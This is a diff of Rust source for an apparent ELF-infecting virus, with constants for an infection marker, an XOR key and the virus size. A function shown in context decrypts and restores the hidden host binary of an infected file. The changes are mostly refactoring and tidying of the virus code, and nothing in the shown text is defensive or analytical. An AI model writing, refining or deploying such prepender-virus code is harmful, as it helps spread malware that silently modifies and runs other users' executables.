@@ -9,7 +9,7 @@ use std::{env, fs, process};
 const ELF_MAGIC: &[u8; 4] = &[0x7f, 0x45, 0x4c, 0x46]; // b"\x7FELF"
 const INFECTION_MARK: &[u8; 5] = &[0x40, 0x54, 0x4d, 0x5a, 0x40]; // @TMZ@
 const XOR_KEY: &[u8; 5] = &[0x46, 0x65, 0x32, 0x4f, 0x33]; // Fe2O3
-const VIRUS_SIZE: u64 = 2696040;
+const VIRUS_SIZE: u64 = 2696496;
 
 fn payload() {
     println!("Rusting is a chemical reaction of iron in the presence of oxygen.
@@ -23,18 +23,15 @@ fn get_file_size(path: &OsStr) -> u64 {
 }
 
 fn read_file(path: &OsStr) -> Vec<u8> {
-    let mut buf = Vec::new();
-    let mut f = File::open(path).unwrap();
-    f.read_to_end(&mut buf).unwrap();
+    let buf = fs::read(path).unwrap();
     return buf;
 }
 
-fn xor_enc_dec(input: Vec<u8>) -> Vec<u8> {
-    let mut output = vec![0; input.len()];
+fn xor_enc_dec(mut input: Vec<u8>) -> Vec<u8> {
     for x in 0..input.len() {
-        output[x] = input[x] ^ XOR_KEY[x % XOR_KEY.len()];
+        input[x] = input[x] ^ XOR_KEY[x % XOR_KEY.len()];
     }
-    return output;
+    return input;
 }
 
 fn is_elf(path: &OsStr) -> bool {
@@ -42,8 +39,10 @@ fn is_elf(path: &OsStr) -> bool {
     let mut f = File::open(path).unwrap();
     f.read(&mut ident).unwrap();
 
-    if &ident == ELF_MAGIC { // this will work for PIE executables as well 
-        return true;         // but can fail for shared libraries during execution
+    if &ident == ELF_MAGIC {
+        // this will work for PIE executables as well
+        // but can fail for shared libraries during execution
+        return true;
     }
     return false;
 }
@@ -94,7 +93,7 @@ fn run_infected_host(path: &OsString) {
         .write(true)
         .mode(0o755)
         .open(plain_host_path)
-        .unwrap(); 
+        .unwrap();
     infected.seek(SeekFrom::Start(VIRUS_SIZE)).unwrap();
     infected.read_to_end(&mut encrypted_host_buf).unwrap();
     drop(infected);
